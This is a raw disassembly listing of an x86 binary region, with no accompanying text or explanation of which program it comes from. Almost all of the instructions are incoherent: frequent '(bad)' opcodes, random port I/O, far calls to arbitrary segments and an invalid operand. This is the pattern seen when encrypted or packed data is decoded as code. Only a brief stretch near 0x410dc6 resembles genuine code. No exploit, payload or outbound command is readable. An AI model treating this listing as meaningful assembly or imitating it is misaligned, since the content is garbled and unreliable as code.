  410c42:	out    0xf9,eax
  410c44:	(bad)  
  410c45:	fst    DWORD PTR [edi]
  410c47:	push   ebp
  410c48:	imul   esp,DWORD PTR [edx],0x2fb79b13
  410c4e:	pop    ebx
  410c4f:	in     eax,0xdb
  410c51:	test   BYTE PTR [edi+esi*4],cl
  410c54:	shr    DWORD PTR [eax],0x20
  410c57:	int3   
  410c58:	data16 xchg ah,ah
  410c5b:	ins    DWORD PTR es:[edi],dx
  410c5c:	call   0xaea3:0xfaa0d82f
  410c63:	add    al,0x3d
  410c65:	sti    
  410c66:	inc    edx
  410c67:	aas    
  410c68:	cli    
  410c69:	aad    0x5a
  410c6b:	mov    esi,0x7b964a1
  410c70:	push   ebp
  410c71:	mov    ds:0x65033b7d,al
  410c76:	adc    ebx,DWORD PTR [ebp+0x6b642082]
  410c7c:	and    BYTE PTR [ebx],dh
  410c7e:	sbb    al,0x65
  410c80:	arpl   WORD PTR ds:0x95416c19,bp
  410c86:	dec    eax
  410c87:	(bad)  
  410c88:	cmp    edx,DWORD PTR [edi+0x4eef62d7]
  410c8e:	add    DWORD PTR [esi],ecx
  410c90:	daa    
  410c91:	les    ecx,FWORD PTR [ebx-0x9]
  410c94:	jp     0x410c1f
  410c96:	(bad)  
  410c97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c98:	mov    eax,ds:0xb0243f29
  410c9d:	shl    BYTE PTR [ebx-0x5e4d6249],0xe3
  410ca4:	sbb    BYTE PTR [edx],dl
  410ca6:	pop    ebp
  410ca7:	adc    cl,bl
  410ca9:	xchg   edi,eax
  410caa:	leave  
  410cab:	jnp    0x410cb4
  410cad:	cmp    DWORD PTR [esi-0x3b],edi
  410cb0:	test   al,0xd5
  410cb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cb3:	outs   dx,DWORD PTR ds:[esi]
  410cb4:	push   0xffffffcc
  410cb6:	mov    edx,DWORD PTR [ecx+ebp*4+0x51be8a5e]
  410cbd:	cmp    BYTE PTR [edi],0xaf
  410cc0:	test   DWORD PTR [eax+0xb5b0f92],esi
  410cc6:	and    BYTE PTR [edi-0x23],0x2f
  410cca:	test   DWORD PTR gs:[edx],esp
  410ccd:	pop    ds
  410cce:	aaa    
  410ccf:	out    dx,eax
  410cd0:	test   ebp,ebx
  410cd2:	mov    dl,BYTE PTR [ebx]
  410cd4:	jae    0x410d4b
  410cd6:	shl    dl,0x14
  410cd9:	daa    
  410cda:	std    
  410cdb:	jnp    0x410d38
  410cdd:	dec    ebp
  410cde:	dec    esp
  410cdf:	call   0xb2ccc790
  410ce4:	sub    al,dh
  410ce6:	arpl   WORD PTR [edx+esi*2+0x197adc06],ax
  410ced:	test   eax,0x74327f4b
  410cf2:	xchg   edx,eax
  410cf3:	pop    ebx
  410cf4:	std    
  410cf5:	push   esp
  410cf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410cf8:	imul   ebx,DWORD PTR [edx+0x67aee87],0x62036919
  410d02:	jle    0x410d04
  410d04:	mov    al,ds:0x7d6efe79
  410d09:	pop    es
  410d0a:	popf   
  410d0b:	push   0xffffffe1
  410d0d:	add    ecx,0xa91d0d6d
  410d13:	add    edx,DWORD PTR [ecx]
  410d15:	aad    0xbf
  410d17:	stos   DWORD PTR es:[edi],eax
  410d18:	clc    
  410d19:	xchg   ebx,eax
  410d1a:	sub    al,0xd9
  410d1c:	sar    BYTE PTR [edi-0xc],0x33
  410d20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d21:	in     eax,dx
  410d22:	sub    eax,0x8f5a10fe
  410d27:	mov    dl,0x5a
  410d29:	jp     0x410d13
  410d2b:	cmp    dl,BYTE PTR [ecx-0x9ad1761]
  410d31:	repz aas 
  410d33:	mov    esp,0xab920126
  410d38:	inc    esi
  410d39:	bound  eax,QWORD PTR [ecx+0x14]
  410d3c:	add    al,0xa7
  410d3e:	into   
  410d3f:	sub    eax,DWORD PTR [esi+0x7bfcd09d]
  410d45:	add    eax,0xd6d048ba
  410d4a:	cwde   
  410d4b:	fcomp  QWORD PTR [ebp+eax*4-0x4e67c30f]
  410d52:	xchg   edi,edi
  410d54:	cmp    DWORD PTR [esi],ebx
  410d56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d57:	or     dl,BYTE PTR [ebx]
  410d59:	sbb    al,0xa3
  410d5b:	mov    edi,0x76a5086c
  410d60:	ds push ds
  410d62:	icebp  
  410d63:	nop
  410d64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d65:	mov    edx,ecx
  410d67:	out    0xa8,al
  410d69:	mov    dh,BYTE PTR [ecx+0x2a]
  410d6c:	mov    BYTE PTR [edi],ah
  410d6e:	lock mov esi,0xcd9ab9bc
  410d74:	adc    BYTE PTR [ecx+eiz*1-0x78a4d061],dh
  410d7b:	test   BYTE PTR [ecx],bh
  410d7d:	stc    
  410d7e:	sub    eax,0x4892f376
  410d83:	or     DWORD PTR [ecx+0x37],0x2f
  410d87:	in     al,0xba
  410d89:	xlat   BYTE PTR ds:[ebx]
  410d8a:	and    BYTE PTR [ebp+ebp*1+0x84bda4b],0x54
  410d92:	adc    esp,DWORD PTR [eax-0x17827d4d]
  410d98:	push   cs
  410d99:	jae    0x410d60
  410d9b:	sbb    al,0x8c
  410d9d:	sub    BYTE PTR [ecx],0x39
  410da0:	adc    esp,DWORD PTR [ecx]
  410da2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410da3:	dec    ecx
  410da4:	stc    
  410da5:	cmp    DWORD PTR [ebx-0x76e0959c],0xabfae826
  410daf:	inc    ebx
  410db0:	ror    DWORD PTR [ebx+0x48],cl
  410db3:	ret    0xdd
  410db6:	out    dx,eax
  410db7:	adc    ecx,DWORD PTR [ebx+0xf28106]
  410dbd:	add    BYTE PTR [eax],al
  410dbf:	ror    BYTE PTR [ecx+0x568b1455],0x4
  410dc6:	xor    eax,0xba699573
  410dcb:	xor    ecx,edx
  410dcd:	shrd   eax,ecx,0x2
  410dd1:	or     eax,DWORD PTR [ebp+0x10]
  410dd4:	shr    ecx,0x2
  410dd7:	mov    DWORD PTR [ebp+0x8],eax
  410dda:	mov    eax,ecx
  410ddc:	or     eax,DWORD PTR [ebp+0x14]
  410ddf:	mov    ecx,DWORD PTR [ebx]
  410de1:	mov    edx,DWORD PTR [ebx+0x4]
  410de4:	push   eax
  410de5:	push   DWORD PTR [ebp+0x8]
  410de8:	push   edx
  410de9:	push   ecx
  410dea:	call   0x41e026
  410def:	mov    eax,DWORD PTR [esi]
  410df1:	mov    ecx,DWORD PTR [esi+0x4]
  410df4:	shrd   eax,ecx,0x2
  410df8:	shr    ecx,0x2
  410dfb:	shr    edx,0x1e
  410dfe:	jmp    0x411388
  410e03:	ret    0x707f
  410e06:	and    eax,0x58c21820
  410e0b:	cmp    DWORD PTR [ebx-0x70],ebp
  410e0e:	outs   dx,BYTE PTR ds:[esi]
  410e0f:	pop    es
  410e10:	dec    esi
  410e11:	mov    BYTE PTR [edx+0x1616509b],dh
  410e17:	cmp    eax,0x98161604
  410e1c:	(bad)  
  410e1d:	sbb    al,0xe7
  410e1f:	in     al,dx
  410e20:	fdivr  st,st(3)
  410e22:	xor    eax,0xb34ae6a2
  410e27:	retf   0x3cfb
  410e2a:	shl    ch,cl
  410e2c:	mov    BYTE PTR [edi],dh
  410e2e:	adc    eax,DWORD PTR [ebx]
  410e30:	(bad)  
  410e31:	and    bl,cl
  410e33:	jns    0x410de6
  410e35:	sbb    ah,BYTE PTR [edx]
  410e37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e38:	mov    al,ds:0xdaef18bd
  410e3d:	mov    ah,0xcf
  410e3f:	sti    
  410e40:	lods   eax,DWORD PTR ds:[esi]
  410e41:	pusha  
  410e42:	sbb    ecx,edx
  410e44:	push   ebx
  410e45:	loope  0x410dff
  410e47:	cli    
  410e48:	pop    ebp
  410e49:	pop    ebx
  410e4a:	sbb    DWORD PTR [edi-0x36e5577],esi
  410e50:	xchg   ebp,eax
  410e51:	or     al,0xfd
  410e53:	pop    es
  410e54:	or     ebx,DWORD PTR [eax]
  410e56:	pop    ds
  410e57:	ins    DWORD PTR es:[edi],dx
  410e58:	mov    ecx,0x2fe7e16b
  410e5d:	leave  
  410e5e:	(bad)  
  410e5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e60:	popf   
  410e61:	pop    ecx
  410e62:	push   ss
  410e63:	mov    ds:0xf19aa366,eax
  410e68:	mov    dl,0xc7
  410e6a:	lods   al,BYTE PTR ds:[esi]
  410e6b:	and    bh,al
  410e6d:	pushw  ds
  410e6f:	lods   al,BYTE PTR ds:[esi]
  410e70:	jge    0x410ec6
  410e72:	cmp    eax,0x6ffda224
  410e77:	ja     0x410e93
  410e79:	cli    
  410e7a:	(bad)  
  410e7c:	add    eax,0x43edbc6e
  410e81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e82:	xor    BYTE PTR [ecx],bh
  410e84:	je     0x410e88
  410e86:	loopne 0x410ed2
  410e88:	js     0x410ec5
  410e8a:	cmp    al,0x5d
  410e8c:	cdq    
  410e8d:	frstor [edx-0x2d]
  410e90:	mov    edx,0x90264fd0
  410e95:	adc    al,0x16
  410e97:	jae    0x410e94
  410e99:	aad    0x3b
  410e9b:	xchg   esi,eax
  410e9c:	adc    DWORD PTR [esi-0x4e],ecx
  410e9f:	jnp    0x410eec
  410ea1:	cmp    eax,0x446a1b5e
  410ea6:	in     eax,dx
  410ea7:	sbb    dh,BYTE PTR [ebp-0x2f3e55ed]
  410ead:	(bad)  
  410eae:	rcl    DWORD PTR [ecx+0x1d36e0ea],0xe9
  410eb5:	paddw  mm5,QWORD PTR [ebx-0x17b1b43a]
  410ebc:	dec    ecx
  410ebd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ebe:	jns    0x410ea9
  410ec0:	daa    
  410ec1:	popf   
  410ec2:	jge    0x410ed5
  410ec4:	lahf   
  410ec5:	dec    esi
  410ec6:	pop    edx
  410ec7:	stos   DWORD PTR es:[edi],eax
  410ec8:	int    0xd2
  410eca:	ret    
  410ecb:	xchg   edi,eax
  410ecc:	mov    ds:0x57e87cbf,eax
  410ed1:	fsubr  st,st(6)
  410ed3:	jle    0x410eb2
  410ed5:	jo     0x410ec9
  410ed7:	pop    eax
  410ed8:	mov    eax,ds:0x833fcbb
  410edd:	repnz cld 
  410edf:	mov    cl,0x4d
  410ee1:	pop    ss
  410ee2:	retf   
  410ee3:	xlat   BYTE PTR ds:[ebx]
  410ee4:	jl     0x410ede
  410ee6:	dec    eax
  410ee7:	punpckhwd mm3,mm6
  410eea:	mov    eax,0xcaf2b318
  410eef:	test   BYTE PTR [edi-0x64],dh
  410ef2:	pop    esp
  410ef3:	sub    edi,esp
  410ef5:	(bad)  
  410ef7:	push   0x38
  410ef9:	imul   BYTE PTR ss:0x826fdc0b
  410f00:	sbb    eax,0xd44550df
  410f05:	shl    BYTE PTR [ecx-0x2a80c1b8],0x9f
  410f0c:	inc    ebx
  410f0d:	dec    edx
  410f0e:	inc    esi
  410f0f:	cs mov esi,0x4c4cd82b
  410f15:	stos   BYTE PTR es:[edi],al
  410f16:	or     eax,0x11e059bc
  410f1b:	test   BYTE PTR [edi-0x6],bl
  410f1e:	mov    ds:0x20e52da9,al
  410f23:	push   0x1900e9c0
  410f28:	jecxz  0x410f07
  410f2a:	mov    cl,0x11
  410f2c:	mov    bl,dl
  410f2e:	dec    ebx
  410f2f:	sbb    bl,BYTE PTR [eax+0x0]
  410f32:	adc    BYTE PTR [edx+0x2c8d5e81],dl
  410f38:	or     al,0xc7
  410f3a:	sub    al,0x12
  410f3c:	daa    
  410f3d:	jecxz  0x410ee5
  410f3f:	mov    eax,ds:0xb6938da8
  410f44:	add    BYTE PTR ds:[ebp+edi*1+0x2e7669fc],ch
  410f4c:	sbb    eax,0x980cbaf3
  410f51:	xor    eax,0x3a3a37c5
  410f56:	jge    0x410f96
  410f58:	bound  eax,QWORD PTR [esi+0x4c]
  410f5b:	adc    ebp,DWORD PTR [ebx-0x6a96918b]
  410f61:	aam    0xd0
  410f63:	mov    eax,ds:0xcd997224
  410f68:	xchg   dl,ch
  410f6a:	xor    DWORD PTR [esp+ebp*1],ecx
  410f6d:	mov    BYTE PTR [eax+edx*4],0x67
  410f71:	sahf   
  410f72:	xor    al,0x2a
  410f74:	dec    ebp
  410f75:	and    DWORD PTR [eax],edx
  410f77:	fiadd  WORD PTR [ebx]
  410f79:	(bad)  
  410f7a:	add    dh,ah
  410f7c:	ja     0x410f57
  410f7e:	sub    esi,edx
  410f80:	pop    ebp
  410f81:	aas    
  410f82:	scas   eax,DWORD PTR es:[edi]
  410f83:	daa    
  410f84:	dec    ebx
  410f85:	pop    ss
  410f86:	enter  0x1e32,0x26
  410f8a:	fild   QWORD PTR [esi-0x4fdbc47a]
  410f90:	jno    0x410f9e
  410f92:	pop    eax
  410f93:	xor    BYTE PTR [edx+0x462db335],0x65
  410f9a:	pusha  
  410f9b:	imul   ebx,DWORD PTR [esi],0x2b7a28bb
  410fa1:	fdiv   DWORD PTR [ecx-0x4e]
  410fa4:	scas   eax,DWORD PTR es:[edi]
  410fa5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410fa6:	bound  esp,QWORD PTR [ecx+0x4c]
  410fa9:	xchg   ebp,eax
  410faa:	or     eax,0xa78722fb
  410faf:	je     0x410fc4
  410fb1:	test   DWORD PTR [esp+ecx*1],eax
  410fb4:	push   esp
  410fb5:	xchg   edi,eax
  410fb6:	dec    esi
  410fb7:	dec    eax
  410fb8:	inc    ecx
  410fb9:	sbb    eax,0x389375ce
  410fbe:	sub    bl,BYTE PTR [edi+0x2e7dfa2a]
  410fc4:	adc    BYTE PTR [esi+edi*2+0x4722aa57],ch
  410fcb:	jbe    0x410ffb
  410fcd:	adc    eax,0xd6b520ec
  410fd2:	mov    dh,0xe9
  410fd4:	xor    DWORD PTR [edi],edx
  410fd6:	jmp    FWORD PTR [eax-0x79]
  410fd9:	sbb    BYTE PTR [ecx],dh
  410fdb:	(bad)  
  410fdc:	hlt    
  410fdd:	fild   DWORD PTR [ecx+0x46]
  410fe0:	fldenv [edx-0x3a916488]
  410fe6:	enter  0x2018,0x1e
  410fea:	inc    ebx
  410feb:	test   eax,0x7876523
  410ff0:	cmp    al,0x32
  410ff2:	dec    ebp
  410ff3:	pop    ss
  410ff4:	jl     0x410fb7
  410ff6:	mov    esp,0x2af5a442
  410ffb:	repnz fsubr DWORD PTR [esi-0x7]
  410fff:	mov    BYTE PTR [eax+0x1c],dh
  411002:	push   edx
  411003:	push   esi
  411004:	jg     0x411000
  411006:	(bad)  
  411007:	and    dl,BYTE PTR [eax]
  411009:	mov    ds:0x85f5636b,al
  41100e:	or     eax,0xc69a61a7
  411013:	dec    BYTE PTR [eax+0x1e4b4a75]
  411019:	adc    eax,0x4cb32ab
  41101e:	loopne 0x41109a
  411020:	out    dx,al
  411021:	dec    eax
  411022:	mov    edx,0xa00a2f4e
  411027:	or     al,BYTE PTR [esi]
  411029:	aad    0xd8
  41102b:	test   DWORD PTR [edx-0x55],eax
  41102e:	dec    ebx
  41102f:	pop    ebp
  411030:	sub    bh,bl
  411032:	in     eax,dx
  411033:	dec    esp
  411034:	xchg   esp,eax
  411035:	dec    edx
  411036:	inc    edi
  411037:	ins    BYTE PTR es:[edi],dx
  411038:	call   0x75c2:0x8d76342b
  41103f:	mov    eax,0xec0b38a4
  411044:	mov    ecx,0xee6eec10
  411049:	mov    WORD PTR [eax-0x2e],fs
  41104c:	neg    BYTE PTR [ebx+0x11]
  41104f:	and    BYTE PTR [eax-0x74],bh
  411052:	and    edx,DWORD PTR [esi]
  411054:	(bad)  
  411055:	out    dx,al
  411056:	adc    dh,dh
  411058:	les    edx,FWORD PTR [ecx-0x35c29aed]
  41105e:	push   eax
  41105f:	jns    0x411091
  411061:	jo     0x41106b
  411063:	daa    
  411064:	sti    
  411065:	jnp    0x4110ad
  411067:	int3   
  411068:	mov    WORD PTR [ecx+ebx*4+0x65],gs
  41106c:	jne    0x4110c2
  41106e:	(bad)  
  41106f:	add    esi,DWORD PTR [ebp+edx*4+0x6]
  411073:	mov    cl,0x89
  411075:	mov    ebp,0x4226cf37
  41107a:	ror    ecx,cl
  41107c:	out    dx,eax
  41107d:	mov    ah,0x31
  41107f:	xor    dl,0x2b
  411082:	and    ah,cl
  411084:	arpl   WORD PTR [eax+edi*4-0x24bdd9c1],bx
  41108b:	cs xchg esi,eax
  41108d:	jge    0x41101c
  41108f:	jno    0x41105e
  411091:	cdq    
  411092:	lea    esp,[ecx+0x2]
  411095:	stos   BYTE PTR es:[edi],al
  411096:	outs   dx,BYTE PTR ds:[esi]
  411097:	enter  0x61a8,0xd0
  41109b:	addr16 cmc 
  41109d:	jmp    0xb561ec58
  4110a2:	jb     0x411036
  4110a4:	inc    esp
  4110a5:	mov    BYTE PTR [edi-0x3f4d6677],dh
  4110ab:	or     ecx,DWORD PTR [edi-0x557e97c6]
  4110b1:	and    esi,DWORD PTR [ecx]
  4110b3:	push   ebp
  4110b4:	push   esi
  4110b5:	mov    esi,0x81f69e0d
  4110ba:	or     dl,BYTE PTR [edx+0x68]
  4110bd:	and    al,0x84
  4110bf:	lea    ecx,[eax+0x30]
  4110c2:	or     edi,0xda3c1b6
  4110c8:	jmp    0xe3e61086
  4110cd:	and    ecx,DWORD PTR [edi+esi*4]
  4110d0:	stc    
  4110d1:	ins    BYTE PTR es:[edi],dx
  4110d2:	pop    ebp
  4110d3:	test   eax,0x63102081
  4110d8:	frstor [ecx-0x38]
  4110db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110dc:	fcom   QWORD PTR [ebx+0x23]
  4110df:	iret   
  4110e0:	lods   al,BYTE PTR ds:[esi]
  4110e1:	jmp    0x4110bb
  4110e3:	pop    esp
  4110e4:	ins    BYTE PTR es:[edi],dx
  4110e5:	adc    DWORD PTR [eax+eax*4-0x48],0x9
  4110ea:	retf   0xa710
  4110ed:	iret   
  4110ee:	aam    0xc6
  4110f0:	out    0xab,eax
  4110f2:	push   eax
  4110f3:	push   0xffffffe7
  4110f5:	add    DWORD PTR [esi+edx*2],edx
  4110f8:	cdq    
  4110f9:	add    dh,BYTE PTR [edi+0x68]
  4110fc:	or     eax,0x4928dfb3
  411101:	sbb    DWORD PTR [eax],0x35
  411104:	into   
  411105:	aas    
  411106:	mov    DWORD PTR [ebx+eiz*4],eax
  411109:	popf   
  41110a:	sbb    bh,BYTE PTR [eax+0x24]
  41110d:	mov    bh,0x21
  41110f:	sbb    al,0xf6
  411111:	iret   
  411112:	sti    
  411113:	dec    esp
  411114:	or     ah,BYTE PTR [edx-0x6e]
  411117:	or     BYTE PTR [edi+0x1c],0xa8
  41111b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41111c:	jp     0x41118e
  41111e:	in     eax,dx
  41111f:	sbb    BYTE PTR ds:0x3cee26dc,bl
  411125:	sar    DWORD PTR [edi+0x54],cl
  411128:	dec    esp
  411129:	pop    ecx
  41112a:	push   esi
  41112b:	mov    dl,0x9e
  41112d:	ficom  WORD PTR [ecx+0x5b]
  411130:	jmp    0xfc6649b2
  411135:	div    DWORD PTR [ecx+eiz*2+0x65]
  411139:	mov    ecx,0x9152b6aa
  41113e:	test   eax,0x9eb7c8c8
  411143:	(bad)  
  411144:	sub    ebx,ebx
  411146:	inc    eax
  411147:	hlt    
  411148:	les    ebp,FWORD PTR [ebx]
  41114a:	mov    WORD PTR ds:0x5d461d04,ds
  411150:	ins    DWORD PTR es:[edi],dx
  411151:	pop    esp
  411152:	js     0x411171
  411154:	mov    BYTE PTR [edi],bh
  411156:	mov    ds:0xc86d9831,al
  41115b:	int3   
  41115c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41115d:	add    BYTE PTR ds:0x3c2505cc,dh
  411163:	ss js  0x4111e0
  411166:	ret    0xd7ee
  411169:	fisttp WORD PTR [ebx+0x4a]
  41116c:	mov    BYTE PTR ss:[esi],dl
  41116f:	jmp    0x575d:0xe5c8655a
  411176:	jecxz  0x4111e8
  411178:	push   esp
  411179:	leave  
  41117a:	ins    BYTE PTR es:[edi],dx
  41117b:	xor    al,dl
  41117d:	add    ah,BYTE PTR [esi+0x4c]
  411180:	xor    bh,dh
  411182:	jae    0x41115d
  411184:	xor    al,0xa6
  411186:	loope  0x411169
  411188:	adc    al,0x1d
  41118a:	adc    BYTE PTR [edx-0x1b16fe5b],dh
  411190:	dec    ebp
  411191:	popf   
  411192:	call   0xb74c:0x4f6d702a
  411199:	xchg   edi,eax
  41119a:	or     ebp,DWORD PTR [esp+ecx*4]
  41119d:	xchg   ecx,eax
  41119e:	mov    WORD PTR [eax+eax*8+0x67],cs
  4111a2:	(bad)  
  4111a3:	enter  0x7e2a,0xa8
  4111a7:	rcl    ecx,0xf2
  4111aa:	ret    
  4111ab:	adc    BYTE PTR [edx+0x6802e751],ah
  4111b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111b2:	outs   dx,DWORD PTR ds:[esi]
  4111b3:	and    eax,0xd80fd0bb
  4111b8:	push   esi
  4111b9:	call   0xd997:0x36ae9089
  4111c0:	sbb    DWORD PTR [edx+ecx*8+0x7b8a3741],ebp
  4111c7:	aam    0xea
  4111c9:	mov    BYTE PTR [ebp-0x80],bh
  4111cc:	test   eax,0x2f19866
  4111d1:	sti    
  4111d2:	loopne 0x411248
  4111d4:	scas   al,BYTE PTR es:[edi]
  4111d5:	dec    esi
  4111d6:	sub    eax,0xc39f3b17
  4111db:	mov    bl,0xe0
  4111dd:	iret   
  4111de:	adc    ebp,DWORD PTR [edi-0x7050f187]
  4111e4:	xchg   ecx,eax
  4111e5:	push   edx
  4111e6:	xchg   edi,eax
  4111e7:	outs   dx,BYTE PTR ds:[esi]
  4111e8:	lock mov eax,ds:0x20c0c900
  4111ee:	sub    DWORD PTR [edx+0x12],0xfffffff8
  4111f2:	inc    bl
  4111f4:	stc    
  4111f5:	dec    esp
  4111f6:	js     0x4111ec
  4111f8:	mov    DWORD PTR [edi+edx*1-0x78a081f],edx
  4111ff:	and    al,BYTE PTR [ebx]
  411201:	aam    0xb7
  411203:	test   BYTE PTR [ebx-0x64],cl
  411206:	aam    0x8c
  411208:	ja     0x4111e6
  41120a:	aam    0xca
  41120c:	dec    esi
  41120d:	push   0x93155f9f
  411212:	adc    DWORD PTR [edi],0x2b9f18f
  411218:	rcr    BYTE PTR [edx-0x3b8568a2],cl
  41121e:	inc    esi
  41121f:	pop    edi
  411220:	lods   eax,DWORD PTR ds:[esi]
  411221:	(bad)  
  411222:	and    DWORD PTR ds:[edx+0x40fe07ed],ebx
  411229:	push   ds
  41122a:	inc    DWORD PTR [ecx]
  41122c:	test   DWORD PTR [edi-0x22fd3564],ebp
  411232:	pop    es
  411233:	pop    es
  411234:	mov    al,ds:0x593b66a6
  411239:	mov    BYTE PTR [ebx+eiz*2-0x2cb00db8],ch
  411240:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411241:	sub    eax,DWORD PTR [eax+0x17eb1cc5]
  411247:	bound  edi,QWORD PTR [edi-0x43732fa4]
  41124d:	or     DWORD PTR [ecx-0x4a],esp
  411250:	js     0x4111e9
  411252:	pop    ds
  411253:	lahf   
  411254:	lahf   
  411255:	(bad)  
  411257:	xchg   ecx,eax
  411258:	or     al,0xe6
  41125a:	dec    ebx
  41125b:	arpl   sp,ax
  41125d:	popf   
  41125e:	ds pop es
  411260:	mov    al,0x52
  411262:	push   eax
  411263:	push   ss
  411264:	lods   eax,DWORD PTR ds:[esi]
  411265:	cmc    
  411266:	and    al,0x4b
  411268:	mov    dh,0x66
  41126a:	popf   
  41126b:	jp     0x411200
  41126d:	cwde   
  41126e:	(bad)  
  41126f:	shr    BYTE PTR [ebx+ecx*1],1
  411272:	sbb    eax,0xabd99a35
  411277:	pop    ebp
  411278:	(bad)  
  411279:	xor    DWORD PTR [esi+0x2a],ecx
  41127c:	xor    dh,BYTE PTR [edx-0x3c]
  41127f:	in     eax,dx
  411280:	sub    eax,0xc0ea4eac
  411285:	dec    esp
  411286:	jno    0x4112da
  411288:	nop
  411289:	jo     0x411283
  41128b:	aam    0x30
  41128d:	xchg   DWORD PTR [eax+edi*4-0x26],edx
  411291:	leave  
  411292:	daa    
  411293:	or     BYTE PTR [ebx+edi*8-0x1f],ch
  411297:	mov    cl,0xc0
  411299:	mov    edi,0x7ecb77c9
  41129e:	xor    BYTE PTR ds:0xf8bf7188,al
  4112a4:	push   0xffffff8f
  4112a6:	pop    edx
  4112a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112a8:	mov    al,ds:0x1ea4afee
  4112ad:	push   cs
  4112ae:	push   ebx
  4112af:	push   cs
  4112b0:	fnstsw WORD PTR [eax-0x80]
  4112b3:	sti    
  4112b4:	gs mov ebx,0x4a3e3d69
  4112ba:	in     eax,0x7a
  4112bc:	push   es
  4112bd:	or     ebp,DWORD PTR [esi-0x7969619d]
  4112c3:	xor    BYTE PTR [ebx+0x15],al
  4112c6:	sbb    ebx,DWORD PTR [ebx-0x127e06c8]
  4112cc:	mov    esi,0xd5a9ff8a
  4112d1:	or     edi,DWORD PTR [edx]
  4112d3:	push   0xf5b8c886
  4112d8:	shr    DWORD PTR [ebp+0x31],cl
  4112db:	cmp    BYTE PTR [esi-0x73],dh
  4112de:	mov    ch,0xb5
  4112e0:	shl    eax,1
  4112e2:	pop    ss
  4112e3:	add    ebx,ebp
  4112e5:	call   0x333c:0xbcf5c579
  4112ec:	pop    ecx
  4112ed:	jb     0x4112ab
  4112ef:	jne    0x4112ca
  4112f1:	mov    ds:0xc9be110e,al
  4112f6:	daa    
  4112f7:	mov    eax,0xa2d30854
  4112fc:	mov    esi,0x43ab96a3
  411301:	out    0x98,al
  411303:	xor    eax,0x936ca78a
  411308:	stos   BYTE PTR es:[edi],al
  411309:	(bad)  
  41130a:	mov    WORD PTR [esi+0x10],fs
  41130d:	es xor eax,0x3f19410b
  411313:	les    ebp,FWORD PTR [ebx+0x2a]
  411316:	mov    al,0xe3
  411318:	loopne 0x4112dd
  41131a:	in     al,dx
  41131b:	pop    edx
  41131c:	in     eax,dx
  41131d:	test   al,0x1f
  41131f:	push   ds
  411320:	ret    
  411321:	pop    ebp
  411322:	sub    al,0xb5
  411324:	xchg   BYTE PTR [ebp+0x1b],ch
  411327:	out    0x61,eax
  411329:	aam    0x93
  41132b:	shl    BYTE PTR [edi+0x2be8c16c],1
  411331:	(bad)  
  411332:	clc    
  411333:	jmp    0x4112d0
  411335:	jle    0x41133c
  411337:	adc    al,0x5b
  411339:	inc    eax
  41133a:	out    0x29,al
  41133c:	cmc    
  41133d:	xchg   esi,eax
  41133e:	jp     0x4112d5
  411340:	jl     0x411304
  411342:	mov    bl,0x4a
  411344:	in     al,dx
  411345:	jle    0x41138c
  411347:	sbb    eax,0xa329d3be
  41134c:	and    BYTE PTR [ebx+0x5deef7fc],ch
  411352:	ins    DWORD PTR es:[edi],dx
  411353:	cmc    
  411354:	pop    esi
  411355:	dec    ebx
  411356:	aad    0xda
  411358:	push   esi
  411359:	ret    0xd742
  41135c:	(bad)  
  41135d:	shr    BYTE PTR [edi+ecx*2],0xf2
  411361:	adc    BYTE PTR [edi+0x4c55a9dd],cl
  411367:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411368:	adc    al,BYTE PTR [edx+ebp*1-0x6ed98ebf]
  41136f:	repz xchg ecx,eax
  411371:	pop    ebp
  411372:	mov    esi,0x8d05220d
  411377:	out    0xd9,al
  411379:	sub    BYTE PTR [esp+ebx*1-0x4e435737],ch
  411380:	xchg   ebp,eax
  411381:	xor    eax,0x618465df
  411386:	or     cl,BYTE PTR [esi]
  411388:	xor    ecx,0xe702a276
  41138e:	push   ecx
  41138f:	xor    eax,edi
  411391:	mov    DWORD PTR [ebp+0x10],edx
  411394:	jmp    0x41191e
  411399:	jl     0x4113d8
  41139b:	mov    ds:0x1459a28b,eax
  4113a0:	inc    eax
  4113a1:	jmp    DWORD PTR [eax-0x7d774bc0]
  4113a7:	sahf   
  4113a8:	mov    dl,0xd0
  4113aa:	inc    esi
  4113ab:	push   ss
  4113ac:	push   ss
  4113ad:	cmp    eax,0x11161604
  4113b2:	add    eax,0xbe6adde5
  4113b7:	aam    0x6e
  4113b9:	adc    bl,BYTE PTR [edi+0x5e568d72]
  4113bf:	mov    ?,WORD PTR [ecx]
  4113c1:	and    BYTE PTR [edi],0x47
  4113c4:	push   esp
  4113c5:	xchg   ebp,eax
  4113c6:	pop    edi
  4113c7:	or     BYTE PTR [ebp+0x61],ch
  4113ca:	aam    0x2d
  4113cc:	inc    esi
  4113cd:	cmp    BYTE PTR [esi+0x21],ah
  4113d0:	mov    eax,0xfab7edbc
  4113d5:	jo     0x41142d
  4113d7:	sbb    eax,0x8955a5ce
  4113dc:	push   esi
  4113dd:	sar    BYTE PTR [edi+0x10],cl
  4113e0:	nop
  4113e1:	mov    edx,0xb1334a61
  4113e6:	and    BYTE PTR [edi-0x63],0xb7
  4113ea:	push   edx
  4113eb:	sub    al,0x80
  4113ed:	add    BYTE PTR ds:[edi+edx*2],al
  4113f1:	ret    
  4113f2:	loope  0x411443
  4113f4:	jge    0x411396
  4113f6:	jnp    0x411436
  4113f8:	cmp    bh,BYTE PTR [esi+0x10]
  4113fb:	sbb    BYTE PTR ds:0xf24b2d7,cl
  411401:	outs   dx,BYTE PTR ds:[esi]
